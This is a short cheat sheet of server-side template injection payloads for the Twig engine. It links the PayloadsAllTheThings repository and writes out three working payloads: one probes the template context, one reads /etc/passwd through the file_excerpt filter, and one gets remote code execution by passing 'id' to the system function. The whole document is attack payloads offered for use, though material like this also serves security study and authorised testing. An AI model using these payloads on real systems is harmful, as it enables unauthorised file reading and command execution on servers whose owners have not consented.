MAY NEED TO REMOVE WHITE SPACES

**SSTI Cheat sheet for Payloads**
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md


Used to gain more information on current template
```twig
{{ _self }}
```

Used to read local files
```twig
{{ "/etc/passwd"|file_excerpt(1,-1) }}
```

Gaining RCE on Twig using SSTI
```twig
{{ ['id'] | filter('system') }}
```


